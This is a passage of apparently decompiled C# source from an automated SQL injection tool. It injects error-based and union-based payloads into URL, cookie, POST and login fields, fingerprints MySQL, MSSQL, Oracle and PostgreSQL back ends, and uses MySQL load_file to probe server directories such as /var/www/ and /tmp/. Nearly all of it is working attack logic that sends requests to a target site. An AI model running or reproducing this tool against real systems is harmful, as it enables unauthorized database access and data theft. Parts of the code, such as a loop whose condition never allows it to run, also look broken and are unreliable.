                    break;

                case Types.MySQL_With_Error:
                    str2 = MySQLWithError.Info(str2, this.MySQLCollactions, this.MySQLErrorType, lColumn, "");
                    break;

                default:
                    return false;
            }
            switch (this.__InjectionPoint)
            {
                case InjectionPoint.URL:
                    @params.URL = str2;
                    break;

                case InjectionPoint.Cookies:
                    @params.Cookies = str2;
                    break;

                case InjectionPoint.POST:
                    @params.POST = str2;
                    break;

                case InjectionPoint.LoginUser:
                    @params.LoginUser = str2;
                    break;

                case InjectionPoint.LoginPassword:
                    @params.LoginPassword = str2;
                    break;
            }
            if (!string.IsNullOrEmpty(this.LoadHTML(@params)) && this.MySQL_LoadFile(sTraject, sPath))
            {
                flag = true;
            }
            num++;
            if (!flag && !this.PausedOrCanceled())
            {
                goto Label_0294;
            }
            goto Label_0309;
        Label_0249:
            switch (num)
            {
                case 0:
                    sPath = "/var/www/";
                    goto Label_0065;

                case 1:
                    sPath = "/tmp/";
                    goto Label_0065;

                case 2:
                    sPath = "/var/tmp/";
                    goto Label_0065;

                case 3:
                    sPath = "";
                    goto Label_0065;

                default:
                    return false;
            }
        Label_0294:
            str2 = sTraject;
            @params = new HTMLParams {
                URL = this.URL,
                Cookies = this.Cookies,
                POST = this.POST,
                LoginUser = this.LoginUser,
                LoginPassword = this.LoginPassword
            };
            if (!bLinux)
            {
                goto Label_0028;
            }
            goto Label_0249;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
        Label_0309:
        if (!flag)
        {
            sPath = "";
        }
        return flag;
    }

    private string FindKeyword(string sMainTraject)
    {
        HTMLParams @params;
        OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
        if (onProgressEvent != null)
        {
            onProgressEvent("Analizer thread, finding keyword..", -1, this);
        }
        string str2 = "";
        string[] strArray = new string[2];
        List<string>[] listArray = new List<string>[2];
        List<string> list = new List<string>();
        list.AddRange(Strings.Split(sMainTraject, "/", -1, CompareMethod.Binary));
        list.AddRange(Strings.Split(sMainTraject, "&", -1, CompareMethod.Binary));
        list.AddRange(Strings.Split(sMainTraject, "=", -1, CompareMethod.Binary));
        int index = 0;
        Label_0071:
            @params = new HTMLParams();
            @params.URL = this.URL;
            @params.Cookies = this.Cookies;
            @params.POST = this.POST;
            @params.LoginUser = this.LoginUser;
            @params.LoginPassword = this.LoginPassword;
            if (index == 0)
            {
                goto Label_02B8;
            }
            string str3 = sMainTraject.Replace(" and [t]", "'0=A");
            str3 = sMainTraject.Replace("[t]", "'0=A");
        Label_00E8:
            if ((index > 0) | this.URL.Contains("[t]"))
            {
                switch (this.__InjectionPoint)
                {
                    case InjectionPoint.URL:
                        @params.URL = str3;
                        break;

                    case InjectionPoint.Cookies:
                        @params.Cookies = str3;
                        break;

                    case InjectionPoint.POST:
                        @params.POST = str3;
                        break;

                    case InjectionPoint.LoginUser:
                        @params.LoginUser = str3;
                        break;

                    case InjectionPoint.LoginPassword:
                        @params.LoginPassword = str3;
                        break;
                }
            }
            strArray[index] = this.LoadHTML(@params);
            listArray[index] = new List<string>();
            if (string.IsNullOrEmpty(strArray[index]))
            {
                if (!string.IsNullOrEmpty(str2))
                {
                    return str2;
                }
                this.__RetryExceded = false;
                goto Label_02E1;
            }
            listArray[index].AddRange(Strings.Split(strArray[index].Trim(), " ", -1, CompareMethod.Binary));
            if (index != 1)
            {
                goto Label_02E1;
            }
            if ((listArray[0].Count == 0) & (listArray[1].Count == 0))
            {
                return "";
            }
            if (listArray[0].Count == 0)
            {
                listArray[0].AddRange(listArray[1].ToArray());
                listArray[1].Clear();
            }
            using (List<string>.Enumerator enumerator = listArray[0].GetEnumerator())
            {
                bool flag = false;
            Label_01FD:
                if (!enumerator.MoveNext())
                {
                    goto Label_02E1;
                }
                string current = enumerator.Current;
                current = current.Trim();
                if ((string.IsNullOrEmpty(current) || (current.Length <= 5)) || (listArray[1].Contains(current) || !string.IsNullOrEmpty(str2)))
                {
                    goto Label_01FD;
                }
                foreach (string str5 in list)
                {
                    if (!(flag = !current.Contains(str5) | string.IsNullOrEmpty(str5)))
                    {
                        break;
                    }
                }
                goto Label_029D;
            Label_028A:
                str2 = current;
                if (current.Length <= 5)
                {
                    goto Label_01FD;
                }
                goto Label_02E1;
            Label_029D:
                if (!flag)
                {
                    goto Label_01FD;
                }
                goto Label_028A;
            }
        Label_02B8:
            str3 = sMainTraject.Replace(" and [t]", "null");
            str3 = sMainTraject.Replace("[t]", "null");
            goto Label_00E8;
        Label_02E1:
            index++;
            if (index <= 1)
            {
                goto Label_0071;
            }
            return str2;
    }

    private void IniThreads()
    {
        /*try
        {*/
            bool flag2 = false;
            Types sQLType = new Types();
            string str3;
            int num5 = 0;
            string item = "";
            List<string> lTraject = new List<string>();
            bool flag = this.__CheckUnionInteger | this.__CheckUnionKeyword;
            string sTraject = "";
            switch (this.__InjectionPoint)
            {
                case InjectionPoint.URL:
                    item = this.URL;
                    break;

                case InjectionPoint.Cookies:
                    item = this.Cookies;
                    break;

                case InjectionPoint.POST:
                    item = this.POST;
                    break;

                case InjectionPoint.LoginUser:
                    item = this.LoginUser;
                    break;

                case InjectionPoint.LoginPassword:
                    item = this.LoginPassword;
                    break;
            }
            List<string> lUnions = new List<string>();
            lUnions.AddRange(this.__Unions.ToArray());
            if (!(this.__CheckErrorBasead & (item.ToLower().IndexOf("union".ToLower()) < 0)))
            {
                goto Label_0514;
            }
            if (item.IndexOf("[t]") > 1)
            {
                lTraject.Add(item);
            }
            int num = 0;
            lTraject.Clear();
            goto Label_0361;
        Label_00D4:
            str3 = "Error String";
        Label_00DB:
            num5 = lTraject.Count - 1;
            for (int i = 0; i <= num5; i++)
            {
                sTraject = lTraject[i];
                OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
                if (onProgressEvent != null)
                {
                    onProgressEvent("Analizer thread, trying Error Basead (" + str3 + ") " + Conversions.ToString((int) (num + 1)) + "/8", (int) Math.Round((double) (((double) ((num + 1) * 100)) / 7.0)), this);
                }
                //Les etapes
                if ((this.SQLType == Types.None) | (this.SQLType == Types.Unknown))
                {
                    this.SQLType = this.CheckTypeDB(lTraject[i]);
                }

                if ((this.SQLType == Types.None) & this.__CheckErrorPoints)
                {
                    this.Result = InjectionType.None;
                }
                else if (this.TryErrorBasead(lTraject[i]))
                {
                    sQLType = this.SQLType;
                    flag2 = true;
                }

                if (flag2)
                {
                    break;
                }
                this.__RetryExceded = false;
            }
            if (flag2)
            {
                goto Label_0376;
            }
            this.__RetryExceded = false;
            num++;
            if (num > 7)
            {
                goto Label_0376;
            }
            lTraject.Clear();
            switch (num)
            {
                case 0:
                    goto Label_0361;

                case 1:
                    lTraject.AddRange(BuildTraject(item, "[t] and 1=1", false));
                    goto Label_0357;

                case 2:
                    lTraject.AddRange(BuildTraject(item, " or 1=[t] and 1=1", true));
                    goto Label_0357;

                case 3:
                    lTraject.AddRange(BuildTraject(item, " and [t] and 1=1", true));
                    goto Label_0357;

                case 4:
                    lTraject.AddRange(BuildTraject(item, "' [t] '", true));
                    lTraject.AddRange(BuildTraject(item, "' [t] '".Replace("'", "\""), true));
                    goto Label_0357;

                case 5:
                    lTraject.AddRange(BuildTraject(item, "' and [t] and '1'='1", true));
                    lTraject.AddRange(BuildTraject(item, "' and [t] and '1'='1".Replace("'", "\""), true));
                    goto Label_0357;

                case 6:
                    lTraject.AddRange(BuildTraject(item, "' or 1=[t] and '1'='1", true));
                    lTraject.AddRange(BuildTraject(item, "' or 1=[t] and '1'='1".Replace("'", "\""), true));
                    goto Label_0357;

                case 7:
                    lTraject.AddRange(BuildTraject(item, "' or 1=[t]--", true));
                    lTraject.AddRange(BuildTraject(item, "' or 1=[t]--".Replace("'", "\""), true));
                    goto Label_0357;

                default:
                    goto Label_0357;
            }
        Label_034B:
            str3 = "Error Integer";
            goto Label_00DB;
        Label_0357:
            if (num > 4)
            {
                goto Label_00D4;
            }
            goto Label_034B;
        Label_0361:
            lTraject.AddRange(BuildTraject(item, "[t]", false));
            goto Label_0357;
        Label_0376:
            if (flag2)
            {
                bool flag3 = true;
                if (true == Utls.TypeIsMySQL(this.SQLType))
                {
                    flag = this.__CheckUnionInMySQL_Error && flag;
                }
                else if (flag3 == Utls.TypeIsMSSQL(this.SQLType))
                {
                    flag = this.__CheckUnionInMSSQL_Error && flag;
                }
                else
                {
                    flag = false;
                }
                if (flag)
                {
                    lUnions.Clear();
                    //On test les UNION
                    List<string> list3 = this.__Unions;
                    lock (list3)
                    {
                        int num6 = this.__Unions.Count - 1;
                        for (int j = 0; j <= num6; j++)
                        {
                            if (sTraject.Contains("'") & this.__Unions[j].Contains("'"))
                            {
                                lUnions.Add(this.__Unions[j]);
                            }
                            else if (!sTraject.Contains("'") & !this.__Unions[j].Contains("'"))
                            {
                                lUnions.Add(this.__Unions[j]);
                            }
                            if (sTraject.Contains("\"") & this.__Unions[j].Contains("\""))
                            {
                                lUnions.Add(this.__Unions[j]);
                            }
                            else if (!sTraject.Contains("\"") & !this.__Unions[j].Contains("\""))
                            {
                                lUnions.Add(this.__Unions[j]);
                            }
                        }
                    }
                    flag = lUnions.Count > 0;
                }
            }
        Label_0514:
            if (flag)
            {
                lTraject.Clear();
                if (flag2)
                {
                    item = this.RemoveErrCode(sTraject);
                    lTraject.Add(item);
                }
                else
                {
                    if (item.IndexOf("[t]") > 0)
                    {
                        return;
                    }
                    lTraject.AddRange(BuildTraject(item, "[t]", false));
                }
                this.TryUnionBasead(lTraject, lUnions);
                if ((this.UnionString > 0) | (!flag2 & (this.UnionCount > 0)))
                {
                    this.Result = InjectionType.Union;
                }
                else if (flag2)
                {
                    this.Result = InjectionType.Error;
                    this.SQLType = sQLType;
                }
            }
            else if (flag2)
            {
                this.Result = InjectionType.Error;
            }
        /*}
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
        finally
        {*/
            this.Running = false;
            OnCompleteEventHandler onCompleteEvent = this.OnCompleteEvent;
            /*if (onCompleteEvent != null)
            {*/
                onCompleteEvent(this);
            //}
       /* }*/
    }

    private string LoadHTML(HTMLParams p)
    {
        Analizer analizer;
        string str2 = string.Empty;
        switch (this.__InjectionPoint)
        {
            case InjectionPoint.URL:
                Globals.G_Tools.CheckSQLiStringOfuscation(ref p.URL);
                break;

            case InjectionPoint.Cookies:
                Globals.G_Tools.CheckSQLiStringOfuscation(ref p.Cookies);
                break;

            case InjectionPoint.POST:
                Globals.G_Tools.CheckSQLiStringOfuscation(ref p.POST);
                break;

            case InjectionPoint.LoginUser:
                Globals.G_Tools.CheckSQLiStringOfuscation(ref p.LoginUser);
                break;

            case InjectionPoint.LoginPassword:
                Globals.G_Tools.CheckSQLiStringOfuscation(ref p.LoginPassword);
                break;
        }
        using (HTTP http = new HTTP(this.__TimeOut, false))
        {
            NetworkCredential oCredentials = null;
            if (!string.IsNullOrEmpty(p.LoginUser))
            {
                oCredentials = new NetworkCredential(p.LoginUser, p.LoginPassword);
            }
            int num2 = this.__Retry;
            for (int i = 0; i <= num2; i++)
            {
                if (this.PausedOrCanceled())
                {
                    goto Label_0181;
                }
                this.CheckRequestDelay();
                string sErrDesc = "";
                str2 = http.GetHTML(p.URL, this.__HTTPMethod, ref p.POST, p.Cookies, oCredentials, false, ref sErrDesc);
                if (!string.IsNullOrEmpty(str2))
                {
                    if (http.WebResponse == null)
                    {
                        goto Label_0181;
                    }
                    if (string.IsNullOrEmpty(this.WebServer))
                    {
                        this.WebServer = http.WebResponse.HTTPResponse.Server;
                    }
                    HttpStatusCode statusCode = http.WebResponse.StatusCode;
                    if (((statusCode != HttpStatusCode.PaymentRequired) && (statusCode != HttpStatusCode.ProxyAuthenticationRequired)) && (statusCode != HttpStatusCode.UseProxy))
                    {
                        goto Label_0181;
                    }
                }
            }
        }
        Label_0181:
            analizer = this;
            lock (analizer)
            {
                this.__RetryExceded = string.IsNullOrEmpty(str2);
            }
            return str2;
    }

    private bool MySQL_LoadFile(string sTraject, string sPath)
    {
        bool flag = false;
        /*try
        {*/
            string str;
            List<string> lColumn = new List<string> {
                "load_file(" + Globals.G_Utilities.ConvertTextToHex(sPath) + ")"
            };
            switch (this.SQLType)
            {
                case Types.MySQL_No_Error:
                    str = MySQLNoError.Info(sTraject, this.MySQLCollactions, false, lColumn, "");
                    break;

                case Types.MySQL_With_Error:
                    str = MySQLWithError.Info(sTraject, this.MySQLCollactions, this.MySQLErrorType, lColumn, "");
                    break;

                default:
                    return false;
            }
            HTMLParams p = new HTMLParams {
                URL = this.URL,
                Cookies = this.Cookies,
                POST = this.POST,
                LoginUser = this.LoginUser,
                LoginPassword = this.LoginPassword
            };
            switch (this.__InjectionPoint)
            {
                case InjectionPoint.URL:
                    p.URL = str;
                    break;

                case InjectionPoint.Cookies:
                    p.Cookies = str;
                    break;

                case InjectionPoint.POST:
                    p.POST = str;
                    break;

                case InjectionPoint.LoginUser:
                    p.LoginUser = str;
                    break;

                case InjectionPoint.LoginPassword:
                    p.LoginPassword = str;
                    break;
            }
            str = this.LoadHTML(p);
            if (!string.IsNullOrEmpty(str) && (Globals.G_Dumper.ParseHtmlData(str, this.SQLType).Count > 0))
            {
                return true;
            }
        /*}
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }*/
        return flag;
    }

    public void Paused(bool b)
    {
        this.__Paused = b;
    }

    private bool PausedOrCanceled()
    {
        bool flag = false;
        Analizer analizer = this;
        lock (analizer)
        {
            if (((this.UnionString <= 0) || !this.Running) && !this.__Cancel)
            {
                Analizer analizer2 = this;
                lock (analizer2)
                {
                    if (this.__RetryExceded)
                    {
                        return true;
                    }
                    goto Label_0064;
                }
            }
            return true;
        }
        Label_005D:
            Thread.Sleep(100);
        Label_0064:
            if (this.__Paused)
            {
                goto Label_005D;
            }
            return flag;
    }

    private string RemoveErrCode(string sTraject)
    {
        sTraject = sTraject.Replace("' [t] '", "[t]");
        sTraject = sTraject.Replace("' and [t] and '1'='1", "[t]");
        sTraject = sTraject.Replace("' or 1=[t] and '1'='1", "[t]");
        sTraject = sTraject.Replace("' or 1=[t]--", "[t]");
        sTraject = sTraject.Replace("' [t] '".Replace('\'', '"'), "[t]");
        sTraject = sTraject.Replace("' and [t] and '1'='1".Replace('\'', '"'), "[t]");
        sTraject = sTraject.Replace("' or 1=[t] and '1'='1".Replace('\'', '"'), "[t]");
        sTraject = sTraject.Replace("' or 1=[t]--".Replace('\'', '"'), "[t]");
        sTraject = sTraject.Replace("[t]", "[t]");
        sTraject = sTraject.Replace("[t] and 1=1", "[t]");
        sTraject = sTraject.Replace(" or 1=[t] and 1=1", "[t]");
        sTraject = sTraject.Replace(" and [t] and 1=1", "[t]");
        return sTraject;
    }

    public void Start(InjectionPoint iPoint, enHTTPMethod iHTTPMethod, string sUrl, ref List<string> iUnions, int iUnionStart = 1, int iUnionEnd = 30, string sCookies = "", string sPost = "", string sLoginUser = "", string sLoginPassword = "", bool bCheckErrorBasead = true, bool bCheckUnionInteger = true, bool bCheckUnionKeyword = false, bool bCheckUnionInMySQL_Error = true, bool bCheckUnionInMSSQL_Error = false, Types oSQLType = Types.None)
    {
        this.__InjectionPoint = iPoint;
        this.__HTTPMethod = iHTTPMethod;
        this.__Unions = iUnions;
        this.__UnionStart = iUnionStart;
        this.__UnionEnd = iUnionEnd;
        this.URL = sUrl;
        this.Cookies = sCookies;
        this.POST = sPost;
        this.LoginUser = sLoginUser;
        this.LoginPassword = this.LoginPassword;
        this.__CheckErrorBasead = bCheckErrorBasead;
        this.__CheckUnionInteger = bCheckUnionInteger;
        this.__CheckUnionKeyword = bCheckUnionKeyword;
        this.__CheckUnionInMySQL_Error = bCheckUnionInMySQL_Error;
        this.__CheckUnionInMSSQL_Error = bCheckUnionInMSSQL_Error;
        this.__IsFullAnalized = true;
        this.__Cancel = false;
        this.__Paused = false;
        this.Running = true;
        this.SQLType = oSQLType;
        this.Result = InjectionType.None;
        OnStartEventHandler onStartEvent = this.OnStartEvent;
        if (onStartEvent != null)
        {
            onStartEvent(this);
        }
        new Thread(new ThreadStart(this.IniThreads)).Start();
    }


    private bool TestUnion(string sTraject)
    {
        bool flag = false;
        /*try
        {*/
            Types types;
            bool flag3;
            if (this.UnionString > 0)
            {
                OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
                if (onProgressEvent != null)
                {
                    onProgressEvent("Analizer thread, Testing Union (Column: " + Conversions.ToString(this.UnionString) + " Count: " + Conversions.ToString(this.UnionCount) + ")", -1, this);
                }
            }
            if (!((this.SQLType == Types.None) | (this.SQLType == Types.Unknown)))
            {
                goto Label_011B;
            }
            int num = 0;
            goto Label_00BD;
        Label_0082:
            num++;
            if (num > 3)
            {
                return flag;
            }
            switch (num)
            {
                case 0:
                    goto Label_00BD;

                case 1:
                    types = Types.MSSQL_Unknown;
                    break;

                case 2:
                    types = Types.Oracle_Unknown;
                    break;

                case 3:
                    types = Types.PostgreSQL_Unknown;
                    break;
            }
        Label_00B0:
            if (!this.CheckCollactions(sTraject, InjectionType.Union, types))
            {
                goto Label_0082;
            }
            goto Label_00C1;
        Label_00BD:
            types = Types.MySQL_Unknown;
            goto Label_00B0;
        Label_00C1:
            flag3 = true;
            if (true == Utls.TypeIsOracle(types))
            {
                this.SQLType = Types.Oracle_No_Error;
            }
            else if (flag3 == Utls.TypeIsPostgreSQL(types))
            {
                this.SQLType = Types.PostgreSQL_No_Error;
            }
            else if (flag3 == Utls.TypeIsMySQL(types))
            {
                this.SQLType = Types.MySQL_No_Error;
            }
            else if (flag3 == Utls.TypeIsMSSQL(types))
            {
                this.SQLType = Types.MSSQL_No_Error;
            }
            return true;
        Label_011B:
            if (!this.CheckCollactions(sTraject, InjectionType.Union, this.SQLType))
            {
                return false;
            }
            bool flag4 = true;
            if (true == Utls.TypeIsMySQL(this.SQLType))
            {
                this.SQLType = Types.MySQL_No_Error;
            }
            else if (flag4 == Utls.TypeIsMSSQL(this.SQLType))
            {
                this.SQLType = Types.MSSQL_No_Error;
            }
            else if (flag4 == Utls.TypeIsOracle(this.SQLType))
            {
                this.SQLType = Types.Oracle_No_Error;
            }
            else if (flag4 == Utls.TypeIsPostgreSQL(this.SQLType))
            {
                this.SQLType = Types.PostgreSQL_No_Error;
            }
            return true;
        /*}
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }*/
        return flag;
    }
    private bool UnionFound()
    {
        bool flag = false;
        Analizer analizer = this;
        lock (analizer)
        {
            if (this.UnionString > 0)
            {
                return true;
            }
            if ((this.UnionCount > 0) && ((this.SQLType == Types.Unknown) | (this.SQLType == Types.None)))
            {
                return true;
            }
        }
        return flag;
    }

    private bool TryErrorBasead(string sTraject)
    {
        checked
        {
            bool flag4 = false;
            /*try
            {*/
            string text = "ABC145ZQ62DWQAFPOIYCFD";
            bool flag = true;
            int num = 0;
            if (true == Utls.TypeIsMySQL(this.SQLType))
            {
                num = 0;
            }
            else if (flag == Utls.TypeIsMSSQL(this.SQLType))
            {
                num = 4;
            }
            else if (flag == Utls.TypeIsOracle(this.SQLType))
            {
                num = 6;
            }
            else if (flag == Utls.TypeIsPostgreSQL(this.SQLType))
            {
                num = 12;
            }
            List<string> list = new List<string>();

            while (true)
            {
                bool flag2 = true;
                string item;
                if (true == num <= 2)
                {
                    item = global::Globals.G_Utilities.ConvertTextToHex(text);
                }
                else if (flag2 == num <= 5)
                {
                    item = global::Globals.G_Utilities.ConvertTextToSQLChar(text, false, "+", "char");
                }
                else
                {
                    if (flag2 != num <= 9)
                    {
                        break;
                    }
                    item = global::Globals.G_Utilities.ConvertTextToSQLChar(text, false, "||", "chr");
                }
                list.Add(item);
                string text2;
                switch (num)
                {
                    case 0:
                        text2 = MySQLWithError.Info(sTraject, this.MySQLCollactions, MySQLErrorType.DuplicateEntry, list);
                        this.MySQLErrorType = MySQLErrorType.DuplicateEntry;
                        goto IL_296;
                    case 2:
                        text2 = MySQLWithError.Info(sTraject, this.MySQLCollactions, MySQLErrorType.ExtractValue, list, "");
                        this.MySQLErrorType = MySQLErrorType.ExtractValue;
                        goto IL_296;
                    case 3:
                        text2 = MySQLWithError.Info(sTraject, this.MySQLCollactions, MySQLErrorType.UpdateXML, list, "");
                        this.MySQLErrorType = MySQLErrorType.UpdateXML;
                        goto IL_296;
                    case 4:
                        text2 = MSSQL.Info(sTraject, InjectionType.Error, this.MSSQLCollate, list, "", "");
                        goto IL_296;
                    case 5:
                        this.MSSQLCollate = !this.MSSQLCollate;
                        text2 = MSSQL.Info(sTraject, InjectionType.Error, this.MSSQLCollate, list, "", "");
                        goto IL_296;
                    case 6:
                        text2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.GET_HOST_ADDRESS, list, this.OracleCast, "");
                        this.OracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
                        goto IL_296;
                    case 7:
                        text2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.DRITHSX_SN, list, this.OracleCast, "");
                        this.OracleErrorType = OracleErrorType.DRITHSX_SN;
                        goto IL_296;
                    case 8:
                        text2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.GETMAPPINGXPATH, list, this.OracleCast, "");
                        this.OracleErrorType = OracleErrorType.GETMAPPINGXPATH;
                        goto IL_296;
                    case 9:
                        this.OracleCast = !this.OracleCast;
                        text2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.GET_HOST_ADDRESS, list, this.OracleCast, "");
                        this.OracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
                        goto IL_296;
                    case 10:
                        text2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.DRITHSX_SN, list, this.OracleCast, "");
                        this.OracleErrorType = OracleErrorType.DRITHSX_SN;
                        goto IL_296;
                    case 11:
                        text2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.GETMAPPINGXPATH, list, this.OracleCast, "");
                        this.OracleErrorType = OracleErrorType.GETMAPPINGXPATH;
                        goto IL_296;
                    case 12:
                        text2 = PostgreSQL.Info(sTraject, InjectionType.Error, PostgreSQLErrorType.CAST_INT, list, "");
                        goto IL_296;
                }
                break;
            IL_296:
                Analizer.HTMLParams p = default(Analizer.HTMLParams);
                p.URL = this.URL;
                p.Cookies = this.Cookies;
                p.POST = this.POST;
                p.LoginUser = this.LoginUser;
                p.LoginPassword = this.LoginPassword;
                switch (this.__InjectionPoint)
                {
                    case Analizer.InjectionPoint.URL:
                        p.URL = text2;
                        break;
                    case Analizer.InjectionPoint.Cookies:
                        p.Cookies = text2;
                        break;
                    case Analizer.InjectionPoint.POST:
                        p.POST = text2;
                        break;
                    case Analizer.InjectionPoint.LoginUser:
                        p.LoginUser = text2;
                        break;
                    case Analizer.InjectionPoint.LoginPassword:
                        p.LoginPassword = text2;
                        break;
                }
                text2 = this.LoadHTML(p);
                if (text2.ToLower().Contains(text.ToLower()))
                {
                    // OK Injected TEXT FOunded
                    goto IL_40E;
                }
                bool flag3 = true;
                if (1 == ((num <= 3 || !Utls.TypeIsMySQL(this.SQLType)) ? 0 : 1))
                {
                    break;
                }
                if (flag3 == ((num <= 5 || !Utls.TypeIsMSSQL(this.SQLType)) ? false : true))
                {
                    break;
                }
                if (flag3 == ((num <= 11 || !Utls.TypeIsOracle(this.SQLType)) ? false : true))
                {
                    break;
                }
                if (flag3 == ((num <= 12 || !Utls.TypeIsPostgreSQL(this.SQLType)) ? false : true))
                {
                    break;
                }
                if (this.PausedOrCanceled())
                {
                    break;
                }
                num++;
            }
            goto IL_46B;
        IL_40E:
            flag4 = true;
            this.InjectQuery = sTraject;
            bool flag5 = true;
            if (true == num <= 3)
            {
                this.SQLType = Types.MySQL_With_Error;
            }
            else if (flag5 == num <= 5)
            {
                this.SQLType = Types.MSSQL_With_Error;
            }
            else if (flag5 == num <= 11)
            {
                this.SQLType = Types.Oracle_With_Error;
            }
            else if (flag5 == num <= 12)
            {
                this.SQLType = Types.PostgreSQL_With_Error;
            }
        IL_46B:
            if (flag4)
            {
                switch (this.SQLType)
                {
                    case Types.MySQL_With_Error:
                    case Types.MSSQL_With_Error:
                        flag4 = this.CheckCollactions(sTraject, InjectionType.Error, this.SQLType);
                        break;
                }
            }
            /* }
            catch (Exception expr_49E)
            {
                ProjectData.SetProjectError(expr_49E);
                ProjectData.ClearProjectError();
            }*/
            return flag4;
        }
    }
    private void TryUnionBasead(List<string> lTraject, List<string> lUnions)
    {
        try
        {
            int num3;
            int num4 = (this.__UnionEnd - this.__UnionStart) + 1;
            string str = "";
            if ((this.SQLType == Types.Unknown) | (this.SQLType == Types.None))
            {
                int num11 = lTraject.Count - 1;
                for (int i = 0; i <= num11; i++)
                {
                    this.SQLType = this.CheckTypeDB(lTraject[i]);
                    if (!((this.SQLType == Types.Unknown) | (this.SQLType == Types.None)))
                    {
                        break;
                    }
                }
            }
            int num2 = (num4 * lUnions.Count) * lTraject.Count;
            if (this.__CheckUnionInteger & this.__CheckUnionKeyword)
            {
                num2 *= 2;
            }
            if (num2 > this.__Threads)
            {
                num3 = this.__Threads;
            }
            else
            {
                num3 = num2;
            }
            this.__ThreadPoolAnalizer = new ThreadPool(num3);
            if (Utls.TypeIsOracle(this.SQLType) | Utls.TypeIsPostgreSQL(this.SQLType))
            {
                this.__CheckUnionInteger = false;
                this.__CheckUnionKeyword = true;
            }
            int num6 = 0;
            while (num6 != 0)
            {
                int num12;
                if ((num6 == 1) && !this.__CheckUnionKeyword)
                {
                    goto Label_041A;
                }
            Label_00F2:
                num12 = lTraject.Count - 1;
                for (int j = 0; j <= num12; j++)
                {
                    this.__RetryExceded = false;
                    if (this.__CheckErrorPoints)
                    {
                        this.SQLType = this.CheckTypeDB(lTraject[j]);
                        if (this.SQLType == Types.None)
                        {
                            continue;
                        }
                    }
                    int num13 = lUnions.Count - 1;
                    for (int k = 0; k <= num13; k++)
                    {
                        int num14 = this.__UnionEnd;
                        for (int m = this.__UnionStart; m <= num14; m++)
                        {
                            int num = 0;
                            Thread thread;
                            OnProgressEventHandler onProgressEvent;
                            if (this.PausedOrCanceled())
                            {
                                this.__ThreadPoolAnalizer.AbortThreads();
                            }
                            if (this.UnionFound() | this.PausedOrCanceled())
                            {
                                goto Label_045E;
                            }
                            if (num6 == 0)
                            {
                                thread = new Thread(new ParameterizedThreadStart(_Lambda__16));
                            }
                            else
                            {
                                thread = new Thread(new ParameterizedThreadStart(_Lambda__17));
                            }
                            thread.Name = "Pos : " + Conversions.ToString(num);
                            ThreadControl parameter = new ThreadControl {
                                Thread = thread,
                                UnionString = lUnions[k],
                                Traject = lTraject[j],
                                UnionPostion = m
                            };
                            if (Utls.TypeIsOracle(this.SQLType) && !parameter.UnionString.ToLower().Contains("dual".ToLower()))
                            {
                                parameter.UnionString = parameter.UnionString.Replace("[t]", "[t] from dual");
                            }
                            if (num6 == 1)
                            {
                                if (string.IsNullOrEmpty(str))
                                {
                                    str = this.FindKeyword(parameter.Traject);
                                }
                                if (string.IsNullOrEmpty(str))
                                {
                                    break;
                                }
                                parameter.Keyword = str;
                            }
                            thread.Start(parameter);
                            this.__ThreadPoolAnalizer.Open(thread);
                            string str2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Interaction.IIf(lTraject.Count > 1, "Position: " + Conversions.ToString((int) (j + 1)) + "/" + Conversions.ToString(lTraject.Count) + " ", ""), Interaction.IIf(lUnions.Count > 1, "Union Sytle: " + Conversions.ToString((int) (k + 1)) + "/" + Conversions.ToString(lUnions.Count) + " ", "")), "Union Position: "), m), "/"), this.__UnionEnd));
                            int iPerc = (int) Math.Round(Math.Round((double) (((double) (100 * num)) / ((double) num2))));
                            if (num6 == 0)
                            {
                                onProgressEvent = this.OnProgressEvent;
                                if (onProgressEvent != null)
                                {
                                    onProgressEvent("Analizer thread, trying Union Integer, " + str2, iPerc, this);
                                }
                            }
                            else if (num6 == 1)
                            {
                                onProgressEvent = this.OnProgressEvent;
                                if (onProgressEvent != null)
                                {
                                    onProgressEvent("Analizer thread, trying Union Keyword, " + str2, iPerc, this);
                                }
                            }
                            this.__ThreadPoolAnalizer.WaitForThreads();
                            num++;
                        }
                    }
                }
            Label_041A:
                num6++;
                if (num6 <= 1)
                {
                    continue;
                }
                goto Label_045E;
            Label_0427:
                if (this.__CheckUnionInteger)
                {
                    goto Label_00F2;
                }
                goto Label_041A;
            }
            //goto Label_0427;
        Label_043E:
            if (this.PausedOrCanceled())
            {
                goto Label_046E;
            }
            if (this.__ThreadPoolAnalizer.ThreadCount == 0)
            {
                goto Label_0487;
            }
            Thread.Sleep(200);
        Label_045E:
            if (this.__ThreadPoolAnalizer.Status == ThreadPool.ThreadStatus.Stopped)
            {
                goto Label_0487;
            }
            goto Label_043E;
        Label_046E:
            if (this.__ThreadPoolAnalizer.ThreadCount > 0)
            {
                this.__ThreadPoolAnalizer.AbortThreads();
            }
        Label_0487:
            if (this.UnionFound())
            {
                bool flag = true;
                if (true == Utls.TypeIsMySQL(this.SQLType))
                {
                    this.SQLType = Types.MySQL_No_Error;
                }
                else if (flag == Utls.TypeIsMSSQL(this.SQLType))
                {
                    this.SQLType = Types.MSSQL_No_Error;
                }
                else if (flag == Utls.TypeIsOracle(this.SQLType))
                {
                    this.SQLType = Types.Oracle_No_Error;
                }
                else if (flag == Utls.TypeIsPostgreSQL(this.SQLType))
                {
                    this.SQLType = Types.PostgreSQL_No_Error;
                }
                this.Result = InjectionType.Union;
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
    }
    private void TryUnionPosition(ThreadControl t)
    {
        try
        {
            string str2 = "";
